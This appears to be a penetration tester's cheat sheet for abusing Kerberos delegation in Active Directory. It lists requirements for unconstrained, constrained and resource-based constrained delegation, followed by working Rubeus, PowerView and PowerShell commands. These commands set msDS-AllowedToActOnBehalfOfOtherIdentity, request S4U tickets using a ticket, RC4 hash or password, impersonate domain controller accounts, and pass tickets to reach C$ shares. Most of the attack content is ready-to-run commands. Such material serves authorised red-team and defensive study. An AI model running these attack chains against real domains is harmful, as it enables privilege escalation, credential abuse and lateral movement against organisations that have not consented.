Rubeus /tgtdeleg: abuses the Kerberos GSS-API to retrieve a usable TGT for the current user without needing elevation on the host.
    * Works if user has a session

* Note: Can only impersonate an account who "Cannot Be Delegated" is False and not in Protected Users Group

DELEGATION
-------------------------------------------------------------------------------------------------
Unconstrained Delegation
Bloodhound: Allows Unconstrained Delegation
Trust to ANY service
Requirements:
    userAccountControl=TrustedForDelegation
    SeEnableDelegationPrivilege
    msDS-AllowedToDelegateTo
Stores TGT in memory and used to get TGS for delegated service. TGT can be extracted from memory
    • Works across trusts
---------------------------------------------------------------------------------------------------
Traditional Constrained
Bloodhound: AllowedToDelegate
Trust TO specific services (Attribute is set TO the target)
Requirements:
    Account must have an SPN
        * Must have password, hash, or ticket (tgtdeleg)
    userAccountControl=TrustedToAuthForDelegation (Only required for remote host with SPN)
    msDS-AllowedToDelegateTo (remote host SPN; cifs\remote.local)
S4U Impersonation
---------------------------------------------------------------------------------------------------
Resource Based Constrained Delegation
Bloodhound: GenericWrite
Trust FROM specific services (Attribute is set ON target)
Requirements:
    Account used for s4u must have an SPN
        * Must have password, hash, or ticket (tgtdeleg)
    userAccountControl=TrustedToAuthForDelegation (Only required for remote host with SPN)
    msDS-AllowedToActOnBehalfOfOtherIdentity
        * If write perms: set msDS-AllowedToActOnBehalfOfOtherIdentity to resource (computer/user that has an SPN)
            *Use PowerView to set the security descriptors and the SID from the resource above
        * If you do not have a resource you can try Machine Quota and create a new machine using PowerMad
            * Powerview display ms-ds-machinecountquota: Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
Add SID of resource above to ActOnBehalfOfOtherIdentity attribute

Example: (put in one liner)
         (Set Security Descriptor to user (that has SPN) with GenericWrite Perms)
         Import PowerView
         powerpick $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$('S-1-5-21-340507432-2615605230-720798708-1293'))"
         $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0)
         Get-DomainComputer m3dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
         
         (View Changes were made)
         powerpick $RawBytes = Get-DomainComputer m3dc -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
         $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0; $Descriptor.DiscretionaryAcl
         
         (Impersonate User with Rubeus)
         execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe tgtdeleg /nowrap
         execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /ticket:doIFFDCCBRCg......lNM0MuTE9DQUw= 
         /impersonateuser:kenneth.kea /domain:m3c.local /msdsspn:cifs/m3dc.m3c.local /altservice:ldap /ptt
--------------------------------------------------------------------------------------------------
S4U Impersonation Commands
        Ticket: execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /ticket:doIE9j...TE9DQUw= /impersonateuser:DAVID.GAINES /domain:m3c.local /msdsspn:"time/m3webaw.m3c.local" /altservice:wsman /altservice:host /altservice:http /ptt
        Hash: execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /user:MYTESTCOMPUTER$ /rc4:A6046AE491FEA36346D82E83A79777F7 /impersonateuser:M3DC$ /msdsspn:cifs/m3dc.m3c.local /ptt
        Password: execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /user:james /password:ThisIsMyPassword! /impersonateuser:M3DC$ /msdsspn:cifs/m3dc.m3c.local /ptt
------------------------------------------------------------------------------------------------------
Impersonate if SYSTEM on a computer with contrained delegation
        launch powershell.exe in single-thread apartment mode (with the “-sta” flag)
        powershell -sta
        # load the necessary assembly
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        # execute S4U2Self w/ WindowsIdentity to request a forwardable TGS for the specified user
        $Ident = New-Object System.Security.Principal.WindowsIdentity @('Administrator@TESTLAB.LOCAL')
        # actually impersonate the next context
        $Context = $Ident.Impersonate()
        # implicitly invoke S4U2Proxy with the specified action
        ls \\PRIMARY.TESTLAB.LOCAL\C$
        # undo the impersonation context
        $Context.Undo()
        
